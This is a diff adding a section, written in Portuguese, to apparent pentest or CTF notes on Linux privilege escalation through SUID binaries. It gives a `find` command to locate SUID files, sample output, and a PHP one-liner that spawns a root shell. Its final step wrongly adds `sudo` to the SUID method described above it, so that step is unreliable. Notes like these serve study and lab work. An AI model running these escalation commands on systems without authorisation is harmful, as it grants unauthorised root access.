@@ -161,3 +161,51 @@ su root
 5. **Escalonar privilégios**: `su root`
 
 ---
+
+### SUID Binaries 
+
+Identificar Binaries SUID Interessantes
+
+Para buscar binaries SUID, use o comando abaixo e filtre resultados desnecessários:
+
+```
+find / -perm -u=s -type f 2>/dev/null | grep -v 'snap'
+```
+
+Exemplo de saída relevante:
+```
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/php7.4
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/su
+```
+
+### Exploração de SUID com PHP
+
+Se `/usr/bin/php7.4` estiver listado como um binary SUID, podemos usar isso para escalonar privilégios. Utilize o site [GTFOBins](https://gtfobins.github.io/) para verificar se há um método conhecido para explorar o SUID de PHP.
+
+Comando de Exploração com PHP (GTFOBins)
+
+Para ganhar acesso root usando o SUID de PHP, execute o seguinte comando:
+
+```
+/usr/bin/php7.4 -r 'system("/bin/sh");'
+```
+
+Resumo do Procedimento
+
+1. **Identificar binaries SUID**: `find / -perm -u=s -type f 2>/dev/null | grep -v 'snap'`
+2. **Confirmar o uso de GTFOBins**: Verifique [GTFOBins - PHP](https://gtfobins.github.io/gtfobins/php/#suid) para explorar o binary SUID.
+3. **Executar Exploit**: `sudo /usr/bin/php7.4 -r 'system("/bin/sh");'` para obter um shell como root.
